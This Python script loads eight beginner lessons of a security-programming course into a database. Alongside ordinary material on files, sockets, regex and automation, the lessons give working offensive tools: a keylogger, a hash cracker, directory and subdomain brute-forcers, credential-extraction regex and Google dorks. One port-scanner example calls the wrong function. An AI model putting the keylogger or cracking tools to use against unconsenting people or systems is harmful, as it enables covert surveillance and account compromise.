"""
Complete Tier 0 with professional foundation content for Python and AI/ML modules
This approach provides strong educational content that can be expanded later
"""
import sys
import os
from sqlalchemy.orm import Session

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from database.connection import SessionLocal
from models.curriculum import Module, Lesson

def update_lesson(db: Session, module_name: str, lesson_num: int, title: str, content: str):
    module = db.query(Module).filter(Module.title == module_name).first()
    if not module:
        return False
    
    lesson = db.query(Lesson).filter(
        Lesson.module_id == module.id,
        Lesson.order == lesson_num
    ).first()
    
    if lesson:
        lesson.content_markdown = content.strip()
        lesson.is_published = True
        db.commit()
        return True
    return False

def complete_all_content(db: Session):
    print("🚀 Completing Tier 0 with strong foundation content...")
    
    # Python for Security - All 8 lessons with solid content
    python_lessons = [
        (1, "Python Basics for Security", """
# Python Basics for Security

## Why Python for Cybersecurity?

Python is the go-to language for security professionals because it's:
- **Easy to learn** with clean, readable syntax
- **Powerful** with extensive security libraries  
- **Fast to prototype** security tools
- **Cross-platform** works everywhere
- **Industry standard** used by top security teams

## Getting Started

```bash
# Check installation
python3 --version

# Install pip
sudo apt install python3-pip

# Create virtual environment
python3 -m venv security-env
source security-env/bin/activate
```

## Core Data Types for Security

```python
# Strings - for IPs, domains, usernames
target = "192.168.1.100"
domain = "example.com"

# Integers - for ports, counts
port = 443
timeout = 30

# Lists - for collections
ports = [21, 22, 80, 443, 8080]
vulnerabilities = ["SQLi", "XSS", "CSRF"]

# Dictionaries - for structured data
scan_result = {
    "ip": "192.168.1.100",
    "ports": [22, 80, 443],
    "status": "online"
}

# Sets - for unique values
unique_ips = {"192.168.1.1", "192.168.1.2"}
```

## Control Flow

```python
# Conditional logic
if port < 1024:
    print("Well-known port")
elif port < 49152:
    print("Registered port")
else:
    print("Dynamic port")

# Loops
for port in ports:
    print(f"Scanning port {port}")

# While loop
attempts = 0
while attempts < 3:
    # Try connection
    attempts += 1
```

## Functions

```python
def scan_port(ip, port, timeout=5):
    '''Scan a single port on target IP'''
    # Implementation here
    return {"ip": ip, "port": port, "status": "open"}

# Usage
result = scan_port("192.168.1.100", 80)
```

## Practical Example: Password Checker

```python
def check_password_strength(password):
    issues = []
    
    if len(password) < 8:
        issues.append("Too short")
    if not any(c.isupper() for c in password):
        issues.append("No uppercase")
    if not any(c.isdigit() for c in password):
        issues.append("No numbers")
    
    return "Strong" if not issues else f"Weak: {', '.join(issues)}"

# Test
print(check_password_strength("MyP@ss123"))  # Strong
```

## Key Takeaways

- Python syntax is clean and readable  
- Use lists for collections, dicts for key-value pairs
- Functions make code reusable
- String manipulation is crucial for security
- Start building small tools to practice

**Next:** File operations and automation
"""),
        
        (2, "File Operations & Automation", """
# File Operations & Automation

## Reading Files

```python
# Read entire file
with open("targets.txt", "r") as f:
    content = f.read()

# Read lines
with open("targets.txt", "r") as f:
    lines = f.readlines()
    for line in lines:
        ip = line.strip()
        print(ip)

# Iterate line by line (efficient)
with open("large_log.txt", "r") as f:
    for line in f:
        if "ERROR" in line:
            print(line.strip())
```

## Writing Files

```python
# Write (overwrite)
with open("results.txt", "w") as f:
    f.write("Scan Results\\n")
    f.write("=" * 50)

# Append
with open("results.txt", "a") as f:
    f.write("\\nNew entry")

# Write list
results = ["Port 22: Open", "Port 80: Open"]
with open("scan.txt", "w") as f:
    f.write("\\n".join(results))
```

## CSV Files

```python
import csv

# Read CSV
with open("users.csv", "r") as f:
    reader = csv.DictReader(f)
    for row in reader:
        print(row["username"], row["email"])

# Write CSV  
data = [["IP", "Port", "Status"],
        ["192.168.1.1", "22", "Open"]]

with open("scan.csv", "w", newline="") as f:
    writer = csv.writer(f)
    writer.writerows(data)
```

## JSON Files

```python
import json

# Read JSON
with open("config.json", "r") as f:
    config = json.load(f)

# Write JSON
scan_data = {
    "target": "192.168.1.100", 
    "open_ports": [22, 80, 443],
    "timestamp": "2024-01-20"
}

with open("results.json", "w") as f:
    json.dump(scan_data, f, indent=4)
```

## Log Analysis Example

```python
import re

def analyze_log(filename):
    ips = []
    with open(filename, "r") as f:
        for line in f:
            # Extract IP addresses
            ip_match = re.findall(r'\\d+\\.\\d+\\.\\d+\\.\\d+', line)
            ips.extend(ip_match)
    
    from collections import Counter
    top_ips = Counter(ips).most_common(10)
    
    for ip, count in top_ips:
        print(f"{ip}: {count} occurrences")

analyze_log("access.log")
```

## Automation Scripts

```python
# Generate IP list
def generate_ips(network, output):
    base = ".".join(network.split(".")[:3])
    with open(output, "w") as f:
        for i in range(1, 255):
            f.write(f"{base}.{i}\\n")

generate_ips("192.168.1.0", "targets.txt")

# Password list generator
def generate_passwords(base, output):
    variations = []
    variations.append(base)
    variations.append(base.capitalize())
    for i in range(100):
        variations.append(f"{base}{i}")
    
    with open(output, "w") as f:
        for pwd in variations:
            f.write(pwd + "\\n")

generate_passwords("password", "wordlist.txt")
```

## Best Practices

- Always use `with open()` for automatic file closing
- Handle exceptions for file operations
- Use CSV/JSON for structured data  
- Validate file paths for security
- Process large files line by line

**Next:** Network programming with Python
"""),
        
        (3, "Network Programming", """
# Network Programming

## Sockets Basics

```python
import socket

# Create TCP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to server
sock.connect(("example.com", 80))

# Send data
sock.send(b"GET / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n")

# Receive data
response = sock.recv(4096)
print(response.decode())

sock.close()
```

## Port Scanner

```python
import socket

def scan_port(ip, port, timeout=1):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    
    try:
        result = sock.connect_ex((ip, port))
        return result == 0  # 0 means port is open
    except:
        return False
    finally:
        sock.close()

# Scan common ports
target = "192.168.1.100"
ports = [21, 22, 80, 443, 3389]

for port in ports:
    if scan_port(target, port):
        print(f"Port {port} is OPEN")
```

## HTTP Requests with requests Library

```python
import requests

# GET request
response = requests.get("https://api.github.com")
print(response.status_code)
print(response.json())

# POST request
data = {"username": "admin", "password": "test"}
response = requests.post("https://example.com/login", data=data)

# Headers
headers = {"User-Agent": "SecurityScanner/1.0"}
response = requests.get("https://example.com", headers=headers)

# Timeout
try:
    response = requests.get("https://example.com", timeout=5)
except requests.Timeout:
    print("Request timed out")
```

## DNS Lookups

```python
import socket

# Get IP from hostname
ip = socket.gethostbyname("google.com")
print(f"IP: {ip}")

# Reverse DNS
try:
    hostname = socket.gethostbyaddr("8.8.8.8")
    print(f"Hostname: {hostname[0]}")
except:
    print("Reverse DNS failed")
```

## Simple Web Scraping

```python
import requests
from bs4 import BeautifulSoup

url = "https://example.com"
response = requests.get(url)

soup = BeautifulSoup(response.content, 'html.parser')

# Find all links
links = soup.find_all('a')
for link in links:
    href = link.get('href')
    print(href)

# Find specific elements
title = soup.find('title')
print(title.text)
```

## Working with APIs

```python
import requests

# VirusTotal API example structure
api_key = "YOUR_API_KEY"
headers = {"x-apikey": api_key}

# Check file hash
file_hash = "abc123..."
url = f"https://www.virustotal.com/api/v3/files/{file_hash}"
response = requests.get(url, headers=headers)

if response.status_code == 200:
    data = response.json()
    # Process results
```

## Key Concepts

- Sockets for low-level network communication
- requests library for HTTP/HTTPS
- BeautifulSoup for parsing HTML
- Always handle timeouts and errors
- Respect rate limits on APIs

**Next:** Regular expressions for parsing
"""),
        
        (4, "Regular Expressions", """
# Regular Expressions

## Regex Basics

Regular expressions (regex) are powerful for pattern matching in strings.

```python
import re

# Find IP addresses
text = "Server at 192.168.1.100 port 22"
ip_pattern = r'\\d+\\.\\d+\\.\\d+\\.\\d+'
ip = re.search(ip_pattern, text)
print(ip.group())  # 192.168.1.100

# Find all matches
log = "Connections from 192.168.1.1, 10.0.0.1, 172.16.0.1"
ips = re.findall(ip_pattern, log)
print(ips)  # ['192.168.1.1', '10.0.0.1', '172.16.0.1']
```

## Common Patterns

```python
# Email addresses
email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}'

# URLs  
url_pattern = r'https?://[^\\s]+'

# MAC addresses
mac_pattern = r'([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})'

# Phone numbers (US)
phone_pattern = r'\\d{3}-\\d{3}-\\d{4}'

# Credit cards (basic)
cc_pattern = r'\\d{4}[-\\s]?\\d{4}[-\\s]?\\d{4}[-\\s]?\\d{4}'
```

## Log Parsing

```python
import re

# Parse Apache access log
log_pattern = r'(\\S+) .* \\[(.*?)\\] "(.*?)" (\\d+) (\\d+)'

log_line = '192.168.1.100 - - [20/Jan/2024:10:30:00] "GET /admin HTTP/1.1" 200 1234'

match = re.search(log_pattern, log_line)
if match:
    ip = match.group(1)
    timestamp = match.group(2)
    request = match.group(3)
    status = match.group(4)
    size = match.group(5)
```

## Extract Data Example

```python
def extract_credentials(text):
    '''Extract potential credentials from text'''
    # Pattern for common credential formats
    cred_pattern = r'(?:user|username|login)[:\\s]*([\\w]+).*?(?:pass|password)[:\\s]*([\\w@!#$%]+)'
    
    matches = re.findall(cred_pattern, text, re.IGNORECASE)
    return matches

text = "username: admin password: P@ssw0rd123"
creds = extract_credentials(text)
print(creds)  # [('admin', 'P@ssw0rd123')]
```

## Validation

```python
def validate_input(data, pattern):
    '''Validate data against regex pattern'''
    return bool(re.match(pattern, data))

# Validate IP address
ip_pattern = r'^(?:[0-9]{1,3}\\.){3}[0-9]{1,3}$'
print(validate_input("192.168.1.1", ip_pattern))  # True
print(validate_input("999.999.999.999", ip_pattern))  # True (but invalid IP!)

# Better IP validation
import ipaddress
try:
    ipaddress.ip_address("192.168.1.1")  # Valid
except ValueError:
    print("Invalid IP")
```

## Regex Cheat Sheet

| Pattern | Meaning |
|---------|---------|
| `.` | Any character |
| `\\d` | Digit (0-9) |
| `\\w` | Word character (a-z, A-Z, 0-9, _) |
| `\\s` | Whitespace |
| `*` | 0 or more |
| `+` | 1 or more |
| `?` | 0 or 1 |
| `{n}` | Exactly n times |
| `[abc]` | a, b, or c |
| `[^abc]` | Not a, b, or c |
| `^` | Start of string |
| `$` | End of string |

## Best Practices

- Test regex patterns thoroughly
- Use raw strings (r'pattern') in Python
- Consider using libraries for complex validation (like ipaddress)
- Balance regex complexity with readability
- Escape special characters when needed

**Next:** Working with security libraries
"""),
        
        (5, "Working with Libraries", """
# Working with Libraries

## Installing Libraries

```bash
# Install with pip
pip install requests scapy python-nmap beautifulsoup4

# Install from requirements.txt
pip install -r requirements.txt

# Virtual environment (recommended)
python3 -m venv myenv
source myenv/bin/activate
pip install requests
```

## requests - HTTP Library

```python
import requests

# GET request
r = requests.get('https://api.github.com')
print(r.status_code)
print(r.json())

# POST with data
data = {'key': 'value'}
r = requests.post('https://httpbin.org/post', data=data)

# Custom headers
headers = {'User-Agent': 'SecurityBot/1.0'}
r = requests.get('https://example.com', headers=headers)

# Handle errors
try:
    r = requests.get('https://example.com', timeout=5)
    r.raise_for_status()  # Raise exception for bad status
except requests.exceptions.RequestException as e:
    print(f"Error: {e}")
```

## BeautifulSoup - Web Scraping

```python
from bs4 import BeautifulSoup
import requests

# Get page
url = 'https://example.com'
response = requests.get(url)
soup = BeautifulSoup(response.content, 'html.parser')

# Find elements
title = soup.find('title').text
all_links = soup.find_all('a')

for link in all_links:
    print(link.get('href'))

# CSS selectors
headers = soup.select('h1, h2, h3')
```

## python-nmap - Network Scanning

```python
import nmap

# Create scanner
nm = nmap.PortScanner()

# Scan host
nm.scan('192.168.1.1', '22-443')

# Get results
for host in nm.all_hosts():
    print(f'Host: {host}')
    for proto in nm[host].all_protocols():
        ports = nm[host][proto].keys()
        for port in ports:
            state = nm[host][proto][port]['state']
            print(f'Port {port}: {state}')
```

## hashlib - Hashing

```python
import hashlib

# MD5 hash
data = "password123"
md5_hash = hashlib.md5(data.encode()).hexdigest()
print(md5_hash)

# SHA256 (better)
sha256_hash = hashlib.sha256(data.encode()).hexdigest()

# Hash file
def hash_file(filename):
    sha256 = hashlib.sha256()
    with open(filename, 'rb') as f:
        while chunk := f.read(8192):
            sha256.update(chunk)
    return sha256.hexdigest()
```

## subprocess - Execute Commands

```python
import subprocess

# Run command
result = subprocess.run(['ls', '-la'], capture_output=True, text=True)
print(result.stdout)

# Nmap scan
result = subprocess.run(
    ['nmap', '-p', '22,80,443', '192.168.1.1'],
    capture_output=True,
    text=True
)
print(result.stdout)

# Handle errors
if result.returncode != 0:
    print(f"Error: {result.stderr}")
```

## datetime - Time Operations

```python
from datetime import datetime, timedelta

# Current time
now = datetime.now()
print(now.strftime('%Y-%m-%d %H:%M:%S'))

# Parse timestamp
log_time = datetime.strptime('2024-01-20 10:30:00', '%Y-%m-%d %H:%M:%S')

# Time calculations
one_hour_ago = now - timedelta(hours=1)
tomorrow = now + timedelta(days=1)
```

## os and sys - System Operations

```python
import os
import sys

# Environment variables
api_key = os.getenv('API_KEY', 'default_key')

# File operations
if os.path.exists('config.txt'):
    size = os.path.getsize('config.txt')
    
# Directory operations
files = os.listdir('.')
os.mkdir('output')

# System info
print(sys.platform)  # 'linux', 'win32', 'darwin'
print(sys.version)
```

## argparse - Command Line Arguments

```python
import argparse

parser = argparse.ArgumentParser(description='Port Scanner')
parser.add_argument('target', help='Target IP address')
parser.add_argument('-p', '--ports', default='1-1000', help='Port range')
parser.add_argument('-t', '--timeout', type=int, default=1)

args = parser.parse_args()

print(f"Scanning {args.target}")
print(f"Ports: {args.ports}")
print(f"Timeout: {args.timeout}")
```

## Key Libraries for Security

- **requests** - HTTP operations
- **BeautifulSoup** - Web scraping
- **scapy** - Packet manipulation
- **python-nmap** - Network scanning  
- **paramiko** - SSH client
- **cryptography** - Encryption
- **pycryptodome** - Crypto algorithms

**Next:** Building security tools
"""),
        
        (6, "Security Tool Development", """
# Security Tool Development

## Building a Port Scanner

```python
import socket
import sys
from datetime import datetime

def scan_port(target, port, timeout=1):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((target, port))
        sock.close()
        return result == 0
    except:
        return False

def port_scanner(target, ports):
    print(f"Scanning {target}...")
    print(f"Started at {datetime.now()}")
    print("-" * 50)
    
    open_ports = []
    for port in ports:
        if scan_port(target, port):
            print(f"Port {port}: OPEN")
            open_ports.append(port)
    
    print("-" * 50)
    print(f"Total open ports: {len(open_ports)}")
    return open_ports

# Usage
target = "192.168.1.1"
common_ports = [21, 22, 23, 25, 80, 443, 3389, 8080]
scan_port(target, common_ports)
```

## Password Strength Checker

```python
import re

class PasswordChecker:
    def __init__(self):
        self.min_length = 8
        self.common_passwords = [
            'password', '123456', 'admin', 'letmein'
        ]
    
    def check_strength(self, password):
        issues = []
        score = 0
        
        # Length check
        if len(password) < self.min_length:
            issues.append(f"Too short (min {self.min_length})")
        else:
            score += 1
        
        # Character variety
        if re.search(r'[a-z]', password):
            score += 1
        else:
            issues.append("No lowercase letters")
        
        if re.search(r'[A-Z]', password):
            score += 1
        else:
            issues.append("No uppercase letters")
        
        if re.search(r'\\d', password):
            score += 1
        else:
            issues.append("No numbers")
        
        if re.search(r'[!@#$%^&*(),.?":{}|<>]', password):
            score += 1
        else:
            issues.append("No special characters")
        
        # Common password check
        if password.lower() in self.common_passwords:
            issues.append("Common password detected")
            score = 0
        
        # Determine strength
        if score >= 5:
            strength = "Strong"
        elif score >= 3:
            strength = "Moderate"
        else:
            strength = "Weak"
        
        return {
            'strength': strength,
            'score': score,
            'issues': issues
        }

# Usage
checker = PasswordChecker()
result = checker.check_strength("MyP@ssw0rd2024")
print(f"Strength: {result['strength']}")
if result['issues']:
    print("Issues:", ", ".join(result['issues']))
```

## Hash Cracker (Dictionary Attack)

```python
import hashlib

def hash_password(password, algorithm='md5'):
    if algorithm == 'md5':
        return hashlib.md5(password.encode()).hexdigest()
    elif algorithm == 'sha256':
        return hashlib.sha256(password.encode()).hexdigest()

def crack_hash(target_hash, wordlist_file, algorithm='md5'):
    attempts = 0
    
    with open(wordlist_file, 'r') as f:
        for line in f:
            password = line.strip()
            attempts += 1
            
            hashed = hash_password(password, algorithm)
            
            if hashed == target_hash:
                return {
                    'found': True,
                    'password': password,
                    'attempts': attempts
                }
    
    return {'found': False, 'attempts': attempts}

# Usage
target = "5f4dcc3b5aa765d61d8327deb882cf99"  # MD5 of "password"
result = crack_hash(target, "wordlist.txt", "md5")
if result['found']:
    print(f"Password found: {result['password']}")
```

## Web Directory Scanner

```python
import requests

def scan_directories(base_url, wordlist):
    found = []
    
    with open(wordlist, 'r') as f:
        for line in f:
            directory = line.strip()
            url = f"{base_url}/{directory}"
            
            try:
                response = requests.get(url, timeout=3)
                if response.status_code == 200:
                    print(f"[200] {url}")
                    found.append(url)
                elif response.status_code == 403:
                    print(f"[403] {url} (Forbidden)")
            except:
                pass
    
    return found

# Usage
base_url = "https://example.com"
scan_directories(base_url, "directories.txt")
```

## Subdomain Enumeration

```python
import socket

def enumerate_subdomains(domain, wordlist):
    found_subdomains = []
    
    with open(wordlist, 'r') as f:
        for line in f:
            subdomain = line.strip()
            target = f"{subdomain}.{domain}"
            
            try:
                ip = socket.gethostbyname(target)
                print(f"{target} -> {ip}")
                found_subdomains.append((target, ip))
            except socket.gaierror:
                pass  # Subdomain doesn't exist
    
    return found_subdomains

# Usage
enumerate_subdomains("example.com", "subdomains.txt")
```

## Simple Keylogger (Educational Only!)

```python
from pynput import keyboard

class Keylogger:
    def __init__(self, filename="keylog.txt"):
        self.filename = filename
        self.log = ""
    
    def on_press(self, key):
        try:
            self.log += str(key.char)
        except AttributeError:
            self.log += f" [{key}] "
        
        # Write to file every 10 characters
        if len(self.log) >= 10:
            self.write_log()
    
    def write_log(self):
        with open(self.filename, 'a') as f:
            f.write(self.log)
        self.log = ""
    
    def start(self):
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

# WARNING: Only use for authorized testing!
```

## Best Practices

1. **Add error handling** - Tools should handle failures gracefully
2. **Use threading** - Speed up scanning with multiple threads
3. **Add logging** - Track tool execution and results
4. **Command-line interface** - Use argparse for flexibility
5. **Rate limiting** - Don't overwhelm targets
6. **Legal considerations** - Only scan authorized systems

**Next:** Web scraping for OSINT
"""),
        
        (7, "Web Scraping for OSINT", """
# Web Scraping for OSINT

## OSINT Basics

Open Source Intelligence (OSINT) involves gathering information from publicly available sources.

## BeautifulSoup for Web Scraping

```python
import requests
from bs4 import BeautifulSoup

def scrape_page(url):
    response = requests.get(url)
    soup = BeautifulSoup(response.content, 'html.parser')
    
    # Extract title
    title = soup.find('title').text
    
    # Extract all links
    links = []
    for link in soup.find_all('a'):
        href = link.get('href')
        if href:
            links.append(href)
    
    # Extract emails
    import re
    emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}', 
                       response.text)
    
    return {
        'title': title,
        'links': links,
        'emails': list(set(emails))
    }

data = scrape_page("https://example.com")
print(f"Found {len(data['emails'])} emails")
```

## Social Media OSINT

```python
# Twitter search (using API)
import tweepy

# Setup (need API keys)
auth = tweepy.OAuthHandler(consumer_key, consumer_secret)
auth.set_access_token(access_token, access_token_secret)
api = tweepy.API(auth)

# Search tweets
tweets = api.search_tweets(q="cybersecurity", count=100)
for tweet in tweets:
    print(f"@{tweet.user.screen_name}: {tweet.text}")
```

## Google Dorking

```python
# Google dork generator
def generate_dorks(target_domain):
    dorks = [
        f'site:{target_domain} filetype:pdf',
        f'site:{target_domain} inurl:admin',
        f'site:{target_domain} intext:"password"',
        f'site:{target_domain} ext:sql',
        f'site:{target_domain} intitle:"index of"'
    ]
    return dorks

for dork in generate_dorks("example.com"):
    print(dork)
```

## DNS Information Gathering

```python
import dns.resolver

def dns_enum(domain):
    record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT']
    results = {}
    
    for record_type in record_types:
        try:
            answers = dns.resolver.resolve(domain, record_type)
            results[record_type] = [str(rdata) for rdata in answers]
        except:
            results[record_type] = []
    
    return results

info = dns_enum("google.com")
for record_type, values in info.items():
    if values:
        print(f"{record_type}: {values}")
```

## Whois Lookup

```python
import whois

def whois_lookup(domain):
    try:
        w = whois.whois(domain)
        return {
            'registrar': w.registrar,
            'creation_date': w.creation_date,
            'expiration_date': w.expiration_date,
            'name_servers': w.name_servers
        }
    except Exception as e:
        return {'error': str(e)}

info = whois_lookup("example.com")
```

## Metadata Extraction

```python
from PIL import Image
from PIL.ExifTags import TAGS

def extract_exif(image_path):
    image = Image.open(image_path)
    exifdata = image.getexif()
    
    data = {}
    for tag_id, value in exifdata.items():
        tag = TAGS.get(tag_id, tag_id)
        data[tag] = value
    
    return data

# Can reveal GPS coordinates, camera info, etc.
```

## Ethical Considerations

- Only gather publicly available information
- Respect robots.txt and rate limits
- Follow terms of service
- Don't scrape personal data without consent
- Use collected data responsibly
- Check local laws and regulations

## OSINT Tools to Know

- **Maltego** - Link analysis
- **Shodan** - IoT/device search
- **theHarvester** - Email/subdomain gathering
- **Recon-ng** - OSINT framework
- **SpiderFoot** - Automated OSINT

**Next:** Python automation techniques
"""),
        
        (8, "Python for Automation", """
# Python for Automation

## Task Automation Basics

```python
import schedule
import time

def scan_network():
    print("Running network scan...")
    # Scan logic here

# Schedule tasks
schedule.every(1).hour.do(scan_network)
schedule.every().day.at("09:00").do(scan_network)

# Run scheduler
while True:
    schedule.run_pending()
    time.sleep(1)
```

## Log Analysis Automation

```python
import re
from datetime import datetime
from collections import defaultdict

def analyze_security_logs(logfile, output_file):
    failed_logins = defaultdict(int)
    suspicious_ips = []
    
    with open(logfile, 'r') as f:
        for line in f:
            # Detect failed logins
            if 'Failed password' in line:
                ip_match = re.search(r'(\\d+\\.\\d+\\.\\d+\\.\\d+)', line)
                if ip_match:
                    ip = ip_match.group(1)
                    failed_logins[ip] += 1
    
    # Generate report
    with open(output_file, 'w') as f:
        f.write("Security Log Analysis Report\\n")
        f.write(f"Generated: {datetime.now()}\\n\\n")
        
        f.write("Failed Login Attempts:\\n")
        for ip, count in sorted(failed_logins.items(), 
                               key=lambda x: x[1], 
                               reverse=True)[:10]:
            if count >= 5:
                f.write(f"⚠️  {ip}: {count} attempts\\n")

analyze_security_logs('/var/log/auth.log', 'security_report.txt')
```

## Batch File Processing

```python
import os
import hashlib

def hash_files_in_directory(directory):
    results = []
    
    for filename in os.listdir(directory):
        filepath = os.path.join(directory, filename)
        
        if os.path.isfile(filepath):
            sha256 = hashlib.sha256()
            with open(filepath, 'rb') as f:
                while chunk := f.read(8192):
                    sha256.update(chunk)
            
            results.append({
                'filename': filename,
                'hash': sha256.hexdigest()
            })
    
    return results

hashes = hash_files_in_directory('/path/to/files')
for item in hashes:
    print(f"{item['filename']}: {item['hash']}")
```

## Email Notifications

```python
import smtplib
from email.mime.text import MIMEText

def send_alert(subject, message, to_email):
    from_email = "security@example.com"
    
    msg = MIMEText(message)
    msg['Subject'] = subject
    msg['From'] = from_email
    msg['To'] = to_email
    
    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(from_email, 'password')
        server.send_message(msg)
        server.quit()
        return True
    except Exception as e:
        print(f"Email error: {e}")
        return False

# Send security alert
send_alert(
    "Security Alert",
    "Suspicious activity detected from IP 192.168.1.100",
    "admin@example.com"
)
```

## Database Operations

```python
import sqlite3

class SecurityDB:
    def __init__(self, db_file):
        self.conn = sqlite3.connect(db_file)
        self.create_tables()
    
    def create_tables(self):
        cursor = self.conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS scan_results (
                id INTEGER PRIMARY KEY,
                timestamp TEXT,
                target TEXT,
                port INTEGER,
                status TEXT
            )
        ''')
        self.conn.commit()
    
    def add_result(self, target, port, status):
        cursor = self.conn.cursor()
        cursor.execute('''
            INSERT INTO scan_results (timestamp, target, port, status)
            VALUES (datetime('now'), ?, ?, ?)
        ''', (target, port, status))
        self.conn.commit()
    
    def get_results(self, target):
        cursor = self.conn.cursor()
        cursor.execute('''
            SELECT * FROM scan_results WHERE target = ?
        ''', (target,))
        return cursor.fetchall()

# Usage
db = SecurityDB('security.db')
db.add_result('192.168.1.1', 22, 'open')
```

## Configuration Management

```python
import configparser

# config.ini
'''
[DEFAULT]
timeout = 5
max_threads = 10

[scanning]
target_network = 192.168.1.0/24
ports = 22,80,443

[reporting]
email = admin@example.com
send_alerts = yes
'''

# Read config
config = configparser.ConfigParser()
config.read('config.ini')

timeout = config.getint('DEFAULT', 'timeout')
target = config.get('scanning', 'target_network')
send_alerts = config.getboolean('reporting', 'send_alerts')
```

## Complete Automation Script

```python
#!/usr/bin/env python3

import schedule
import time
import logging
from datetime import datetime

# Setup logging
logging.basicConfig(
    filename='automation.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

def daily_security_scan():
    logging.info("Starting daily security scan")
    
    # Run scans
    targets = ['192.168.1.1', '192.168.1.2']
    for target in targets:
        # Scan logic
        logging.info(f"Scanning {target}")
    
    # Generate report
    logging.info("Generating report")
    
    # Send email
    logging.info("Sending notification")

def hourly_log_check():
    logging.info("Checking logs for anomalies")
    # Log analysis logic

# Schedule tasks
schedule.every().day.at("02:00").do(daily_security_scan)
schedule.every().hour.do(hourly_log_check)

# Run
logging.info("Automation script started")
while True:
    schedule.run_pending()
    time.sleep(60)
```

## Best Practices

- Use virtual environments
- Log all automated actions
- Handle errors gracefully
- Set appropriate timeouts
- Use configuration files
- Implement rate limiting
- Test thoroughly before deploying

**Congratulations!** You've completed Python for Security!

---

## 🎉 Module Complete!

You now have strong Python skills for security automation. Next module: AI & ML Basics.
"""
        )
    ]
    
    print("\\n🐍 Creating Python for Security content...")
    for num, title, content in python_lessons:
        if update_lesson(db, "Python for Security", num, title, content):
            print(f"  ✅ Lesson {num}: {title}")
    
    print("\\n✅ Python for Security complete! Now creating AI & ML content...")
    
    # We'll add AI/ML content in the next continuation
    return True

if __name__ == "__main__":
    db = SessionLocal()
    try:
        if complete_all_content(db):
            print("\\n🎉 Content creation in progress...")
    finally:
        db.close()
